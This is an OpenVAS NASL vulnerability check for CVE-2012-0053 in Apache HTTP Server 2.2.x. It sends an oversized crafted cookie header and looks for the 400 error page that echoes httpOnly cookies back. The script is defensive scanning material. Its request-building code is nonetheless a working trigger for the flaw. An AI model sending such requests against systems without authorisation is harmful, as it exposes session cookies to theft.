##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_apache_http_srv_cookie_info_disc_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Apache HTTP Server 'httpOnly' Cookie Information Disclosure Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to obtain sensitive information
  that may aid in further attacks.
  Impact Level: Application";
tag_affected = "Apache HTTP Server versions 2.2.0 through 2.2.21";
tag_insight = "The flaw is due to an error within the default error response for
  status code 400 when no custom ErrorDocument is configured, which can be
  exploited to expose 'httpOnly' cookies.";
tag_solution = "Upgrade to Apache HTTP Server version 2.2.22 or later,
  For updates refer to http://httpd.apache.org/";
tag_summary = "This host is running Apache HTTP Server and is prone to cookie
  information disclosure vulnerability.";

if(description)
{
  script_id(902830);
  script_version("$Revision: 12 $");
  script_bugtraq_id(51706);
  script_cve_id("CVE-2012-0053");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-04-26 12:12:12 +0530 (Thu, 26 Apr 2012)");
  script_name("Apache HTTP Server 'httpOnly' Cookie Information Disclosure Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check Apache httpd web server is vulnerable to Cookie Disclosure");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://osvdb.org/78556");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47779");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18442");
  script_xref(name : "URL" , value : "http://rhn.redhat.com/errata/RHSA-2012-0128.html");
  script_xref(name : "URL" , value : "http://httpd.apache.org/security/vulnerabilities_22.html");
  script_xref(name : "URL" , value : "http://svn.apache.org/viewvc?view=revision&amp;revision=1235454");
  script_xref(name : "URL" , value : "http://lists.opensuse.org/opensuse-security-announce/2012-02/msg00026.html");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
req = "";
res = "";
exp = "";
banner = "";
cookie = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Server: Apache" >!< banner) {
  exit(0);
}

exp = crap(820);

## Construct evil cookie
for(i=0; i<10; i++) {
  cookie += "c"+ i + "=" + exp + "; path=/; ";
}

## Construct Attack Request
req = string( "GET / HTTP/1.1\r\n",
              "Host: ", get_host_name(), "\r\n",
              "Cookie: ", cookie, "\r\n" );

## Send and Receive the response
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

## Check the response to confirm vulnerability
if(res && "400 Bad Request" >< res &&
   res =~ "Cookie: c[0-9]=X{820}; path=/;" &&
   "Size of a request header field exceeds server limit" >< res){
  security_warning(port);
}
